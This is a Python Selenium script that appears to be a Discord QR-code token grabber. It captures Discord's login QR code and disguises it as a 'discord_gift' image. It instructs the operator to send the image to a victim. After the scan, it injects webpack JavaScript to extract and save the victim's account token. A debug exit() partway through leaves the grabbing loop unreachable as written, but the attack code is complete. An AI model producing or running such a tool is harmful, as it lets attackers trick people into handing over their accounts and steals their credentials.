from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import base64
import time
import os
from dtg import utitlites
from selenium.webdriver.common.by import By


def logo_qr():
    im1 = Image.open(os.path.join('image', 'qr_code.png'), 'r')
    im2 = Image.open(os.path.join('image', 'overlay.png'), 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save(os.path.join('image', 'final_qr.png'), quality=95)


def paste_template():
    print("STARTING FUNCTION 1")
    im1 = Image.open(os.path.join('image', 'template.png'), 'r')
    im2 = Image.open(os.path.join('image', 'final_qr.png'), 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=95)


def main():
    utitlites.show_logo()
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)

    executable_path = ""
    if os.name == 'nt':
        current_dir_file = os.path.join(os.getcwd(), "chromedriver.exe")
        sys32_dir_file = "C:\\Windows\\System32\\chromedriver.exe"
        if os.path.isfile(current_dir_file):
            executable_path = current_dir_file
        elif os.path.isfile(sys32_dir_file):
            executable_path = sys32_dir_file
        else:
            executable_path = None
    else:
        current_dir_file = os.path.join(os.getcwd(), "chromedriver")
        usrbin_file = os.path.join("usr", "bin", "chromedriver")
        bin_file = os.path.join("bin", "chromedriver")
        if os.path.isfile(current_dir_file):
            executable_path = current_dir_file
        elif os.path.isfile(usrbin_file):
            executable_path = usrbin_file
        elif os.path.isfile(bin_file):
            executable_path = bin_file
        else:
            executable_path = None

    if executable_path is None:
        driver = webdriver.Chrome(options=options)
    else:
        driver = webdriver.Chrome(
            options=options,
            executable_path=executable_path
        )

    driver.get('https://discord.com/login')
    time.sleep(utitlites.Config.DISCORD_WAIT_TIME)
    print('- Page loaded.')

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='html.parser')

    div = soup.find('div', class_='qrCodeOverlay_ae8574')
    qr_code = div.find('img')['src']

    print(div)
    print("="*50)
    print(qr_code)
    print("="*50)
    file = os.path.join(os.getcwd(), 'image', 'qr_code.png')
    print(file)
    # image_element = driver.find_element(by=By.XPATH, value=f"//img[@src='{qr_code}']")
    image_element = driver.find_element(by=By.XPATH, value=f"//div[@class='qrCodeOverlay_ae8574']")
    print(image_element)
    print(dir(image_element))
    tmp = image_element.screenshot_as_png
    print(tmp)
    print(type(tmp))

    with open("file.png", "wb") as file:
        file.write(tmp)

    exit()

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    print('+ QR Code has been generated > ./discord_gift.png')
    print('+ Send the QR Code to user and scan. Waiting...')

    while True:
        if discord_login != driver.current_url:
            print('! Grabbing token..')
            token = driver.execute_script(r'''
var req = webpackJsonp.push([
    [], {
        extra_id: (e, t, r) => e.exports = r
    },
    [
        ["extra_id"]
    ]
]);
for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        let t = req.c[e].exports;
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
    }
return token;   
                ''')
            print('-'*8)
            print('+ Token grabbed:', token)
            print('-'*8)
            utitlites.save_results_to_file(str(token))
            break

    print('+ Task complete')


if __name__ == '__main__':
    main()
